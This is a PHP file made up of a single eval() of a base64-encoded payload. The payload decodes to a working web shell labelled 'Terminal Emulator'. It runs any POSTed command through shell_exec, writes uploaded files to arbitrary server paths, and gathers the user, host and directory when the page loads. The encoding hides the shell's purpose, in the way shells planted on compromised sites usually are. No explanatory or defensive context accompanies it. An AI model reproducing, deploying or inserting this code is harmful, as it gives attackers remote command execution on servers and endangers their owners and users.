<?php eval("?>".base64_decode("PD9waHAKaWYgKElTU0VUKCRfUE9TVFsnY21kJ10pKSB7CiAgICAkb3V0cHV0ID0gcHJlZ19zcGxpdCgnL1tcbl0vJywgc2hlbGxfZXhlYygkX1BPU1RbJ2NtZCddLiIgMj4mMSIpKTsKICAgIGZvcmVhY2ggKCRvdXRwdXQgYXMgJGxpbmUpIHsKICAgICAgICBlY2hvIGh0bWxlbnRpdGllcygkbGluZSwgRU5UX1FVT1RFUyB8IEVOVF9IVE1MNSwgJ1VURi04JykgLiAiPGJyPiI7CiAgICB9CiAgICBkaWUoKTsgCn0gZWxzZSBpZiAoIWVtcHR5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGF0aCddKSkgewogICAgJGZpbGVuYW1lID0gJF9GSUxFU1siZmlsZSJdWyJuYW1lIl07CiAgICAkcGF0aCA9ICRfUE9TVFsncGF0aCddOwogICAgaWYgKCRwYXRoICE9ICIvIikgewogICAgICAgICRwYXRoIC49ICIvIjsKICAgIH0gCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImZpbGUiXVsidG1wX25hbWUiXSwgJHBhdGguJGZpbGVuYW1lKSkgewogICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKCRmaWxlbmFtZSkgLiAiIHN1Y2Nlc3NmdWxseSB1cGxvYWRlZCB0byAiIC4gaHRtbGVudGl0aWVzKCRwYXRoKTsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiRXJyb3IgdXBsb2FkaW5nICIgLiBodG1sZW50aXRpZXMoJGZpbGVuYW1lKTsKICAgIH0KICAgIGRpZSgpOwp9Cj8+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT5UZXJtaW5hbCBFbXVsYXRvcjwvdGl0bGU+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBodG1sLCBib2R5IHsKICAgICAgICAgICAgICAgIG1heC13aWR0aDogMTAwJTsKICAgICAgICA gICAgfQogICAgICAgIAogICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgYm9keSwgLmlucHV0dGV4dCB7CiAgICAgICAgICAgICAgICBmb250LWZhbWlseTogIkx1Y2lkYSBDb25zb2xlIiwgIkx1Y2lkYSBTYW5zIFR5cGV3cml0ZXIiLCBtb25hY28sICJCaXRzdHJlYW0gVmVyYSBTYW5zIE1vbm8iLCBtb25vc3BhY2U7CiAgICAgICAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAgICAgICBmb250LXN0eWxlOiBub3JtYWw7CiAgICAgICAgICAgICAgICBmb250LXZhcmlhbnQ6IG5vcm1hbDsKICAgICAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA0MDA7CiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDogMjBweDsKICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgLmNvbnNvbGUgewogICAgICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLm91dHB1dCB7CiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgIC AgIGhlaWdodDogYXV0bzsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIG92ZXJmbG93LXk6IHNjcm9sbDsKICAgICAgICAgICAgICAgIHRvcDogMDsKICAgICAgICAgICAgICAgIGJvdHRvbTogMzBweDsKICAgICAgICAgICAgICAgIGxlZnQ6IDVweDsKICAgICAgICAgICAgICAgIHJpZ2h0OiAwOwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIC5pbnB1dCBmb3JtIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDBweDsKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgLnVzZXJuYW1lIHsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIHdpZHRoOiBhdXRvOwogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA1cHg7CiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICB9CgogICAgICAgICAgICAuaW5wdXQgewogICAgICAgICAgICAgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICMzMzMzMzM7CiAgICAgICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIGJvdHRvbTogMDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLmlucHV0d GV4dCB7CiAgICAgICAgICAgICAgICB3aWR0aDogYXV0bzsKICAgICAgICAgICAgICAgIGhlaWdodDogMzBweDsKICAgICAgICAgICAgICAgIGJvdHRvbTogMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMHB4OwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgICAgIGJvcmRlcjogMDsKICAgICAgICAgICAgICAgIGZsb2F0OiBsZWZ0OwogICAgICAgICAgICAgICAgcGFkZGluZy1sZWZ0OiA4cHg7CiAgICAgICAgICAgICAgICBjb2xvcjogI2ZmZjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgLmlucHV0dGV4dDpmb2N1cyB7CiAgICAgICAgICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICAgICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMnB4OwogICAgICAgICAgICB9CgogICAgICAgICAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxMDEwMTA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIDo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzMwMzAzMDsgCiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0iY29uc29sZSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im91dHB1dCIgaWQ9Im91dHB1dCI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0IiBpZD0iaW5wdXQiPgogICAgICAgICAgICAgICAgPGZv cm0gaWQ9ImZvcm0iIG1ldGhvZD0iR0VUIiBvblN1Ym1pdD0ic2VuZENvbW1hbmQoKSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idXNlcm5hbWUiIGlkPSJ1c2VybmFtZSI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJpbnB1dHRleHQiIGlkPSJpbnB1dHRleHQiIHR5cGU9InRleHQiIG5hbWU9ImNtZCIgYXV0b2NvbXBsZXRlPSJvZmYiIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGZvcm0gaWQ9InVwbG9hZCIgbWV0aG9kPSJQT1NUIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgaWQ9ImZpbGVicm93c2VyIiBvbmNoYW5nZT0ndXBsb2FkRmlsZSgpJyAvPgogICAgICAgIDwvZm9ybT4KICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgICAgICAgIHZhciB1c2VybmFtZSA9ICIiOwogICAgICAgICAgICB2YXIgaG9zdG5hbWUgPSAiIjsKICAgICAgICAgICAgdmFyIGN1cnJlbnREaXIgPSAiIjsKICAgICAgICAgICAgdmFyIHByZXZpb3VzRGlyID0gIiI7CiAgICAgICAgICAgIHZhciBkZWZhdWx0RGlyID0gIiI7CiAgICAgICAgICAgIHZhciBjb21tYW5kSGlzdG9yeSA9IFtdOwogICAgICAgICAgICB2YXIgY3VycmVudENvbW1hbmQgPSAwOwogICAgICAgICAgICB2YXIgaW5wdXRUZXh0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbnB1dHRleHQnKTsKICAgICAgICAgICAgdmFyIGlucHV0RWxlbWVudCA9IGR vY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpbnB1dCIpOwogICAgICAgICAgICB2YXIgb3V0cHV0RWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvdXRwdXQiKTsKICAgICAgICAgICAgdmFyIHVzZXJuYW1lRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ1c2VybmFtZSIpOwogICAgICAgICAgICB2YXIgdXBsb2FkRm9ybUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidXBsb2FkIik7CiAgICAgICAgICAgIHZhciBmaWxlQnJvd3NlckVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZmlsZWJyb3dzZXIiKTsKICAgICAgICAgICAgZ2V0U2hlbGxJbmZvKCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBnZXRTaGVsbEluZm8oKSB7CiAgICAgICAgICAgICAgICB2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1ZXN0LnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFyc2VkUmVzcG9uc2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHBhcnNlZFJlc3BvbnNlWzBdOwogICAgICAgICAgICAgICAgICAgICAgICBob3N0bmFtZSA9IHBhcnNlZFJlc3BvbnNlWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50RGlyID0gIHBhcnNlZFJlc3Bvbn NlWzJdLnJlcGxhY2UobmV3IFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAiLyIpOwogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0RGlyID0gY3VycmVudERpcjsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOwogICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJbnB1dFdpZHRoKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0Lm9wZW4oIlBPU1QiLCAiIiwgdHJ1ZSk7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZCgiY21kPXdob2FtaTsgaG9zdG5hbWU7IHB3ZCIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBzZW5kQ29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICB2YXIgY29tbWFuZCA9IGlucHV0VGV4dEVsZW1lbnQudmFsdWU7CiAgICAgICAgICAgICAgICB2YXIgb3JpZ2luYWxDb21tYW5kID0gY29tbWFuZDsKICAgICAgICAgICAgICAgIHZhciBvcmlnaW5hbERpciA9IGN1cnJlbnREaXI7CiAgICAgICAgICAgICAgICB2YXIgY2QgPSBmY WxzZTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29tbWFuZEhpc3RvcnkucHVzaChvcmlnaW5hbENvbW1hbmQpOwogICAgICAgICAgICAgICAgc3dpdGNoQ29tbWFuZChjb21tYW5kSGlzdG9yeS5sZW5ndGgpOwogICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9ICIiOwoKICAgICAgICAgICAgICAgIHZhciBwYXJzZWRDb21tYW5kID0gY29tbWFuZC5zcGxpdCgiICIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAocGFyc2VkQ29tbWFuZFswXSA9PSAiY2QiKSB7CiAgICAgICAgICAgICAgICAgICAgY2QgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZWRDb21tYW5kLmxlbmd0aCA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiY2QgIitkZWZhdWx0RGlyKyI7IHB3ZCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzFdID09ICItIikgewogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrcHJldmlvdXNEaXIrIjsgcHdkIjsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiK2NvbW1hbmQrIjsgcHdkIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHBhcnNlZENvbW1hbmRbMF0gPT0gImNsZWFyIikgewogICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgICAgICAgICAgICAg cmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwYXJzZWRDb21tYW5kWzBdID09ICJ1cGxvYWQiKSB7CiAgICAgICAgICAgICAgICAgICAgZmlsZUJyb3dzZXJFbGVtZW50LmNsaWNrKCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gImNkICIrY3VycmVudERpcisiOyAiICsgY29tbWFuZDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWVzdC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFyc2VkUmVzcG9uc2UgPSByZXF1ZXN0LnJlc3BvbnNlVGV4dC5zcGxpdCgiPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNEaXIgPSBjdXJyZW50RGlyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudERpciA9IHBhcnNlZFJlc3BvbnNlWzBdLnJlcGxhY2UobmV3IFJlZ0V4cCgiJnNvbDsiLCAiZyIpLCAiLyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9J2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+Iis iOiIrb3JpZ2luYWxEaXIrIiMgIitvcmlnaW5hbENvbW1hbmQrIjwvZGl2Pjxicj4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWVFbGVtZW50LmlubmVySFRNTCA9ICI8ZGl2IHN0eWxlPSdjb2xvcjogI2ZmMDAwMDsgZGlzcGxheTogaW5saW5lOyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjoiK2N1cnJlbnREaXIrIiMiOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5pbm5lckhUTUwgKz0gIjxkaXYgc3R5bGU9J2NvbG9yOiNmZjAwMDA7IGZsb2F0OiBsZWZ0Oyc+Iit1c2VybmFtZSsiQCIraG9zdG5hbWUrIjwvZGl2PjxkaXYgc3R5bGU9J2Zsb2F0OiBsZWZ0Oyc+IisiOiIrY3VycmVudERpcisiIyAiK29yaWdpbmFsQ29tbWFuZCsiPC9kaXY+PGJyPiIgKyByZXF1ZXN0LnJlc3BvbnNlVGV4dC5yZXBsYWNlKG5ldyBSZWdFeHAoIjxicj48YnI+JCIpLCAiPGJyPiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0RWxlbWVudC5zY3JvbGxUb3AgPSBvdXRwdXRFbGVtZW50LnNjcm9sbEhlaWdodDsKICAgICAgICAgICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW5wdXRXaWR0aCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgcmVxdWVzdC5vcGVuKCJQT1NUIiwgIiIsIHRydWUpOwogICAgICAgICAgICAgICAgcmVxdWVzdC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cm xlbmNvZGVkIik7CiAgICAgICAgICAgICAgICByZXF1ZXN0LnNlbmQoImNtZD0iK2VuY29kZVVSSUNvbXBvbmVudChjb21tYW5kKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGUoKSB7CiAgICAgICAgICAgICAgICB2YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVuZCgnZmlsZScsIGZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXSwgZmlsZUJyb3dzZXJFbGVtZW50LmZpbGVzWzBdLm5hbWUpOwogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdwYXRoJywgY3VycmVudERpcik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciByZXF1ZXN0ID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcXVlc3QucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dEVsZW1lbnQuaW5uZXJIVE1MICs9IHJlcXVlc3QucmVzcG9uc2VUZXh0KyI8YnI+IjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIHJlcXVlc3Qub3BlbigiUE9TVCIsICIiLCB0cnVlKTsKICAgICAgICAgICAgICAgIHJlcXVlc3Quc2VuZChmb3JtRGF0YSk7CiAgICAgICAgICAgICAgICBvdXRwdXRFbGVtZW50LmlubmVyS FRNTCArPSAiPGRpdiBzdHlsZT0nY29sb3I6I2ZmMDAwMDsgZmxvYXQ6IGxlZnQ7Jz4iK3VzZXJuYW1lKyJAIitob3N0bmFtZSsiPC9kaXY+PGRpdiBzdHlsZT0nZmxvYXQ6IGxlZnQ7Jz4iKyI6IitjdXJyZW50RGlyKyIjIFVwbG9hZGluZyAiK2ZpbGVCcm93c2VyRWxlbWVudC5maWxlc1swXS5uYW1lKyIuLi48L2Rpdj48YnI+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gdXBkYXRlSW5wdXRXaWR0aCgpIHsKICAgICAgICAgICAgICAgIGlucHV0VGV4dEVsZW1lbnQuc3R5bGUud2lkdGggPSBpbnB1dEVsZW1lbnQuY2xpZW50V2lkdGggLSB1c2VybmFtZUVsZW1lbnQuY2xpZW50V2lkdGggLSAxNTsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZG9jdW1lbnQub25rZXlkb3duID0gY2hlY2tGb3JBcnJvd0tleXM7CgogICAgICAgICAgICBmdW5jdGlvbiBjaGVja0ZvckFycm93S2V5cyhlKSB7CiAgICAgICAgICAgICAgICBlID0gZSB8fCB3aW5kb3cuZXZlbnQ7CgogICAgICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PSAnMzgnKSB7CiAgICAgICAgICAgICAgICAgICAgcHJldmlvdXNDb21tYW5kKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGUua2V5Q29kZSA9PSAnNDAnKSB7CiAgICAgICAgICAgICAgICAgICAgbmV4dENvbW1hbmQoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgZnVuY3Rpb24gcHJldmlvdXNDb21tYW5kKCkgewogICAgICAgICAgICAgICAgaWYgKGN1cnJlbnRDb21tYW5kICE9IDApIHsKICAgICAgICAgICAg ICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kLTEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBuZXh0Q29tbWFuZCgpIHsKICAgICAgICAgICAgICAgIGlmIChjdXJyZW50Q29tbWFuZCAhPSBjb21tYW5kSGlzdG9yeS5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBzd2l0Y2hDb21tYW5kKGN1cnJlbnRDb21tYW5kKzEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBzd2l0Y2hDb21tYW5kKG5ld0NvbW1hbmQpIHsKICAgICAgICAgICAgICAgIGN1cnJlbnRDb21tYW5kID0gbmV3Q29tbWFuZDsKCiAgICAgICAgICAgICAgICBpZiAoY3VycmVudENvbW1hbmQgPT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgaW5wdXRUZXh0RWxlbWVudC52YWx1ZSA9ICIiOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpbnB1dFRleHRFbGVtZW50LnZhbHVlID0gY29tbWFuZEhpc3RvcnlbY3VycmVudENvbW1hbmRdOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKXsgaW5wdXRUZXh0RWxlbWVudC5zZWxlY3Rpb25TdGFydCA9IGlucHV0VGV4dEVsZW1lbnQuc2VsZWN0aW9uRW5kID0gMTAwMDA7IH0sIDApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9ybSIpLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsIGZ 1bmN0aW9uKGV2ZW50KXsKICAgICAgICAgICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCkKICAgICAgICAgICAgfSk7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K")); ?>
